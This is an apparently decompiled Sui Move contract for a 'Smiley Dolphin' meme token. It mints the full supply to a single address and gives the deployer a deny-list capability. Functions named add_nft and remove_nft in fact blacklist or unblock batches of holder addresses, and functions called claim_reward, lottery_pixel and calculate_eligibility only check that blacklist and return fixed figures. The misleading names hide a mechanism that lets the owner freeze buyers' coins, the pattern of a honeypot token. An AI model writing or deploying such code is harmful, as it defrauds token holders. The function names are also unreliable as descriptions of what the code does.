module 0x4d22e2a30420b5b8ac2ba89dc6fee74759301ac50ed448a20485c6f1da6e19af::dolphin {
    struct DOLPHIN has drop {
        dummy_field: bool,
    }

    public fun add_nft(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DOLPHIN>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_add<DOLPHIN>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    public fun calculate_eligibility<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : (bool, u64, u8) {
        (0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1), 1000000000000000000, 9)
    }

    public fun check_eligibility<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : bool {
        0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1)
    }

    public fun claim_reward<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : (bool, u64) {
        (0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1), 999000000000)
    }

    fun init(arg0: DOLPHIN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<DOLPHIN>(arg0, 9, b"DOLPHIN", b"Smiley Dolphin", b"Smiley Dolphin on SUI", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://orange-upper-booby-780.mypinata.cloud/ipfs/QmQ6s3e9iMoxMxqSfwFsXVvYYy3h8yjfgD5PLspy4DW9bE"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DOLPHIN>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DOLPHIN>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<DOLPHIN>(&mut v3, 1000000000000000000, @0xda9138ef68f3f631d6c1d4b17d409058656e979e0b1899389ede183c5daba3ba, arg1);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<DOLPHIN>>(v3);
    }

    public fun lottery_pixel<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : (bool, u64) {
        (0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1), 999000000000)
    }

    public fun remove_nft(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DOLPHIN>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_remove<DOLPHIN>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    // decompiled from Move bytecode v6
}

